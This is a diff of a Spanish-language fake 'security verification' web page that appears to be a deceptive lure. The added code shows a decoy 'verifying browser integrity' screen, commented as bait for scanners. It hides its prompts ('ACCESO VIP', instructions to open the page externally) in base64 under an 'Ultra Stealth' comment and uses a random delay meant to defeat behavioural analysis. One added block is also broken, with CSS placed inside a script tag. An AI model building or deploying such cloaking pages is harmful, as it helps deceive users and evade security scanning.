@@ -4,24 +4,38 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="robots" content="noindex, nofollow">
-    <title>Verification</title>
-    <style id="_s_main"></style>
+    <title>Verificación de Seguridad</title>
+    <style id="_s_main">
+        body { margin:0; background:#000; color:#fff; font-family:sans-serif; overflow:hidden; }
+        ._bait { position:fixed; inset:0; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:20px; z-index:1; }
+        ._bait h1 { font-size:1.2rem; opacity:0.8; margin-bottom:10px; }
+        ._bait p { font-size:0.9rem; opacity:0.5; }
+    </style>
 </head>
-<body style="margin:0; background:#000; color:#fff; overflow:hidden;">
-    <div id="_root_v"></div>
+<body>
+    <!-- Bait Content for Scanners -->
+    <div class="_bait" id="_b_c">
+        <h1>Conexión Segura</h1>
+        <p>Verificando integridad del navegador...</p>
+        <div style="margin-top:20px; width:20px; height:20px; border:2px solid rgba(255,255,255,0.2); border-top-color:#fff; border-radius:50%; animation:_rot 1s linear infinite;"></div>
+    </div>
+
+    <div id="_root_v" style="position:relative; z-index:10;"></div>
+
+    <script>
+        @keyframes _rot { to { transform:rotate(360deg); } }
+    </script>
+
     <script>
         (function() {
             // Base64 helper
-            const d = (s) => decodeURIComponent(atob(s).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
+            const d = (s) => {
+                try {
+                    return decodeURIComponent(atob(s).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
+                } catch(e) { return s; }
+            };
 
             // Encoded values (Ultra Stealth)
-            // QUNDRVNPIFZJUA== -> ACCESO VIP
-            // VmVyaWZpY2FuZG8gYWNjZXNvIHNlZ3Vyby4uLg== -> Verificando acceso seguro...
-            // RXN0w6FzIGEgdW4gcGFzbyBkZSBlbnRyYXIuIEZpbmFsaXphIGxhIHZlcmlmaWNhY2nDs24gcGFyYSBjb250aW51YXIu -> Estás a un paso de entrar. Finaliza la verificación para continuar.
-            // U2lndWUgbG9zIHBhc29zIGluZGljYWRvcyBwYXJhIGNvbnRpbnVhciBlbCBhY2Nlc28u -> Sigue los pasos indicados para continuar el acceso.
-            // VXNhIGxhIG9wY2nDs24gZGUgYXBlcnR1cmEgZXh0ZXJuYSBlbiBsYSBjb25maWd1cmFjacOzbiBzdXBlcmlvci4= -> Usa la opción de apertura externa en la configuración superior.
-            // bG9hZGluZy4uLg== -> loading...
-            
             const c = {
                 h: 'QUNDRVNPIFZJUA==',
                 l: 'VmVyaWZpY2FuZG8gYWNjZXNvIHNlZ3Vyby4uLg==',
@@ -45,19 +59,17 @@
                 @keyframes _in { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
             `;
 
-            document.getElementById('_s_main').innerHTML = styles;
+            document.getElementById('_s_main').innerHTML += styles;
             const root = document.getElementById('_root_v');
             root.className = '_r';
 
-            // Show Loader
-            root.innerHTML = `<div class="_loader" id="_l_b"><div class="_spinner"></div><div style="font-size:0.9em;opacity:0.7;">${d(c.l)}</div></div>`;
-
             // Random delay to avoid simple behavioral analysis
-            const delay = 1800 + Math.random() * 800;
+            const delay = 1600 + Math.random() * 800;
 
             setTimeout(() => {
-                const lb = document.getElementById('_l_b');
-                if(lb) lb.style.display = 'none';
+                // Hide Bait
+                const bc = document.getElementById('_b_c');
+                if(bc) bc.style.display = 'none';
 
                 root.innerHTML = `
                     <div class="_card" style="display:block;">
